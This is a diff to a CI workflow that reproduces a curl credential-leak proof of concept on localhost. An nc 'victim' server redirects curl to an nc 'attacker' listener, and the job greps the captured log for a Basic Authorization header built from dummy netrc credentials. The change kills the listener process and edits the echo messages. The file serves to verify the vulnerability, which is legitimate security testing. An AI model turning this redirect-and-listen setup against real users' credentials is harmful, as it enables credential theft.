@@ -22,8 +22,9 @@ jobs:
 
       - name: Run servers and trigger the exploit
         run: |
-          # 1. Start Attacker server in the background, save output to a log file
+          # 1. Start Attacker server in the background and get its Process ID (PID)
           nc -l -p 9000 > attacker.log &
+          NC_PID=$!
           
           # 2. Start Victim server (redirector) in the background
           echo -e "HTTP/1.1 301 Moved Permanently\nLocation: http://localhost:9000" | nc -l -p 8000 -q 1 &
@@ -35,13 +36,16 @@ jobs:
           echo "--- Triggering curl against localhost:8000 ---"
           curl -v -L --netrc-file .netrc_poc http://localhost:8000
           
-          # 4. Show the results
+          # 4. VERY IMPORTANT: Kill the attacker server so the job can finish
+          kill $NC_PID
+          
+          # 5. Show the results
           echo "--- Content of attacker.log ---"
           cat attacker.log
           
-          # 5. Check if the leak happened
+          # 6. Check if the leak happened
           if grep -q "Authorization: Basic YWRtaW46U3VwZXJTZWNyZXRQYXNzd29yZDEyMw==" attacker.log; then
-            echo "SUCCESS: Credentials successfully leaked!"
+            echo "SUCCESS: Credentials successfully leaked in CI/CD environment!"
             exit 0
           else
             echo "FAILURE: Credentials not found in log."
